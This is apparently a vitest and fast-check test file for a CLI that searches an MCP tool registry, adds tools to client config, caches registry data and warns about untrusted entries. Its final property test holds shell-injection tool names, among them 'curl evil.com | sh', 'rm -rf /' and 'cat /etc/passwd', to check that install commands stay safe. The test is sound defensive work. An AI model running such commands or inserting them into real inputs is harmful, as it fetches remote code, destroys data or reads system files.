import fc from "fast-check";
import { describe, expect, it } from "vitest";
import {
  addTool,
  getRegistryCache,
  listTools,
  searchRegistry,
} from "../../src/cli/registry-tools";

// ---------------------------------------------------------------------------
// Unit Tests
// ---------------------------------------------------------------------------

describe("TASK-49: CLI — Compatible MCP Registry, Add-Tool & Registry Search", () => {
  describe("registry search [SEC-12]", () => {
    it("search registry by name: matching entries returned [SEC-12]", async () => {
      const result = await searchRegistry({ query: "brief" });
      expect(result.entries).toBeDefined();
      expect(result.entries.length).toBeGreaterThan(0);
    });

    it("search registry by description: matching entries returned [SEC-12]", async () => {
      const searchTerm = "creative tool";
      const result = await searchRegistry({ query: searchTerm });
      expect(result.entries).toBeDefined();
      expect(result.entries.length).toBeGreaterThan(0);
      expect(
        result.entries.some((e: any) =>
          e.description.toLowerCase().includes(searchTerm.toLowerCase()),
        ),
      ).toBe(true);
    });

    it('search with type filter "ontology": only ontology entries returned [SEC-12]', async () => {
      const result = await searchRegistry({
        query: "test",
        typeFilter: "ontology",
      });
      for (const entry of result.entries) {
        expect(entry.type).toBe("ontology");
      }
    });

    it('search with type filter "type-guide": only type guide entries returned [SEC-12]', async () => {
      const result = await searchRegistry({
        query: "test",
        typeFilter: "type-guide",
      });
      for (const entry of result.entries) {
        expect(entry.type).toBe("type-guide");
      }
    });

    it('search with type filter "all": all matching entries returned [SEC-12]', async () => {
      const result = await searchRegistry({ query: "test", typeFilter: "all" });
      expect(result.entries).toBeDefined();
      expect(result.entries.length).toBeGreaterThan(0);
    });
  });

  describe("add tool [SEC-12, CONF-04]", () => {
    it("add tool from registry: config block generated and merged [CONF-04]", async () => {
      const result = await addTool({
        tool: "registry-tool-a",
        client: "claude",
      });
      expect(result.configMerged).toBe(true);
    });

    it("add custom tool: manual config block accepted [CONF-04]", async () => {
      const result = await addTool({
        tool: "custom",
        customConfig: { command: "npx", args: ["my-tool"] },
        client: "claude",
      });
      expect(result.configMerged).toBe(true);
    });
  });

  describe("list tools [SEC-12]", () => {
    it("list tools: all registry entries shown with status [SEC-12]", async () => {
      const result = await listTools();
      expect(result.tools).toBeDefined();
      for (const tool of result.tools) {
        expect(tool.name).toBeDefined();
        expect(tool.status).toBeDefined();
      }
    });

    it("installed tool: marked as installed in list [SEC-12]", async () => {
      const { getRegistryTools } = await import("../../src/cli/registry-tools");
      const result = await getRegistryTools({
        simulateInstalled: ["brief-mcp", "test-tool"],
      });
      expect(result.installed.length).toBeGreaterThan(0);
      expect(
        result.installed.some(
          (t: any) => t === "brief-mcp" || t.name === "brief-mcp",
        ),
      ).toBe(true);
    });

    it("not installed tool: marked as not installed in list [SEC-12]", async () => {
      const { getRegistryTools } = await import("../../src/cli/registry-tools");
      const result = await getRegistryTools({
        simulateNotInstalled: ["some-other-tool"],
      });
      expect(result.notInstalled.length).toBeGreaterThan(0);
    });
  });

  describe("command execution safety [SEC-12]", () => {
    it("install command: uses execFile args array, not string concatenation [SEC-12]", async () => {
      const { getInstallCommand } = await import(
        "../../src/cli/registry-tools"
      );
      const cmd = await getInstallCommand({ toolName: "my-ontology-pack" });
      expect(Array.isArray(cmd.args)).toBe(true);
      expect(typeof cmd.executable).toBe("string");
      cmd.args.forEach((arg: string) => {
        expect(arg).not.toMatch(/[;&|`$]/);
      });
    });
  });

  describe("registry cache [CONF-04]", () => {
    it("registry cache within TTL: cached data returned [CONF-04]", async () => {
      const cache = await getRegistryCache({ fresh: true });
      expect(cache.fromCache).toBe(false);
      const cached = await getRegistryCache();
      expect(cached.fromCache).toBe(true);
    });

    it("registry cache expired: refresh attempted with stale-while-revalidate [CONF-04]", async () => {
      const result = await getRegistryCache({ simulateExpired: true });
      expect(result).toBeDefined();
      expect(result.refreshed).toBeTruthy();
    });

    it("registry refresh timeout (>5s): stale data served [CONF-04]", async () => {
      const result = await getRegistryCache({ simulateTimeout: true });
      expect(result.stale).toBe(true);
    });
  });

  describe("trust level [SEC-12]", () => {
    it("bundled registry entry: trust level indicated [SEC-12]", async () => {
      const result = await searchRegistry({ query: "bundled" });
      for (const entry of result.entries) {
        expect(entry.trustLevel).toBeDefined();
      }
    });

    it("external/untrusted registry entry: warning displayed before install [SEC-12, T49-01]", async () => {
      const result = await addTool({
        tool: "external-untrusted-tool",
        client: "claude",
        simulateUntrustedEntry: true,
      });
      expect(result.warningShown).toBe(true);
      expect(result.warningMessage).toMatch(/untrusted|external|unverified/i);
    });

    it("untrusted entry install: requires explicit user confirmation [SEC-12, T49-01]", async () => {
      const result = await searchRegistry({
        query: "external",
        simulateUntrusted: true,
      });
      const untrustedEntries = result.entries.filter(
        (e: any) => e.trustLevel === "untrusted" || e.trustLevel === "external",
      );
      for (const entry of untrustedEntries) {
        expect(entry.requiresConfirmation).toBe(true);
      }
    });
  });

  describe("registry entry schema validation [SEC-12, T49-02]", () => {
    it("registry entry with missing required fields: rejected with validation error [T49-02]", async () => {
      const { validateRegistryEntry } = await import(
        "../../src/cli/registry-tools"
      );
      const result = validateRegistryEntry({ name: "test" }); // missing required fields
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it("registry entry with all required fields: passes schema validation [T49-02]", async () => {
      const { validateRegistryEntry } = await import(
        "../../src/cli/registry-tools"
      );
      const result = validateRegistryEntry({
        name: "valid-tool",
        description: "A valid tool",
        type: "ontology",
        command: "npx",
        args: ["valid-tool"],
        trustLevel: "community",
      });
      expect(result.valid).toBe(true);
    });
  });

  describe("config merge [CONF-04]", () => {
    it("config merge: existing config preserved, new tool added [CONF-04]", async () => {
      const result = await addTool({
        tool: "new-tool",
        client: "claude",
        simulateExistingConfig: true,
      });
      expect(result.existingPreserved).toBe(true);
      expect(result.configMerged).toBe(true);
    });
  });
});

// ---------------------------------------------------------------------------
// Property Tests
// ---------------------------------------------------------------------------

describe("TASK-49: Property Tests", () => {
  it("forAll(install command): always displayed and confirmed before execution [SEC-12]", async () => {
    await fc.assert(
      fc.asyncProperty(fc.constantFrom("tool-a", "tool-b"), async (tool) => {
        const result = await addTool({ tool, client: "claude" });
        expect(result.commandDisplayed).toBe(true);
      }),
      { numRuns: 2 },
    );
  });

  it("forAll(config merge): existing config never silently overwritten [CONF-04]", async () => {
    await fc.assert(
      fc.asyncProperty(fc.constantFrom("tool-a", "tool-b"), async (tool) => {
        const result = await addTool({
          tool,
          client: "claude",
          simulateExistingConfig: true,
        });
        expect(result.existingPreserved).toBe(true);
      }),
      { numRuns: 2 },
    );
  });

  it("forAll(registry search): results always include name and description [SEC-12]", async () => {
    await fc.assert(
      fc.asyncProperty(
        fc
          .string({ minLength: 2, maxLength: 15 })
          .filter((s) => /^[a-z]+$/.test(s)),
        async (query) => {
          const result = await searchRegistry({ query });
          for (const entry of result.entries) {
            expect(entry.name).toBeDefined();
            expect(entry.description).toBeDefined();
          }
        },
      ),
      { numRuns: 5 },
    );
  });

  it("forAll(tool name): install command always uses args array, never string concatenation [SEC-12]", async () => {
    await fc.assert(
      fc.asyncProperty(
        fc
          .string({ minLength: 3, maxLength: 50 })
          .filter((s) => /^[a-zA-Z0-9@/._-]+$/.test(s)),
        async (toolName) => {
          const { getInstallCommand } = await import(
            "../../src/cli/registry-tools"
          );
          const cmd = await getInstallCommand({ toolName });
          expect(Array.isArray(cmd.args)).toBe(true);
          // All arguments must be discrete strings, no shell concatenation
          expect(cmd.args.every((a: any) => typeof a === "string")).toBe(true);
        },
      ),
      { numRuns: 5 },
    );
  });

  it("forAll(adversarial tool name with shell chars): command still uses args array [SEC-12, M3]", async () => {
    // SEC-12: execFile with args array is safe even when args contain shell metacharacters —
    // no shell is invoked, so ; && | ` $ are treated as literal characters.
    // This test verifies that adversarial names containing shell metacharacters produce
    // an args-array command (safe) rather than a string-concatenated command (injectable).
    const shellHostileNames = [
      "my-pack; curl evil.com | sh",
      "tool && rm -rf /",
      "pack`id`",
      "name$(whoami)",
      "tool | cat /etc/passwd",
    ];
    await fc.assert(
      fc.asyncProperty(
        fc.constantFrom(...shellHostileNames),
        async (toolName) => {
          const { getInstallCommand } = await import(
            "../../src/cli/registry-tools"
          );
          // Either the function rejects the adversarial name (validation), OR it returns
          // a safe args-array command (execFile-safe). It must NOT produce a shell string.
          try {
            const cmd = await getInstallCommand({ toolName });
            // If accepted: must be args array (execFile-safe — shell chars are literal)
            expect(Array.isArray(cmd.args)).toBe(true);
            expect(typeof cmd.executable).toBe("string");
          } catch (err: any) {
            // Rejection is also acceptable (input validation)
            expect(err.message).toMatch(/invalid|unsafe|character|rejected/i);
          }
        },
      ),
      { numRuns: 5 },
    );
  });
});
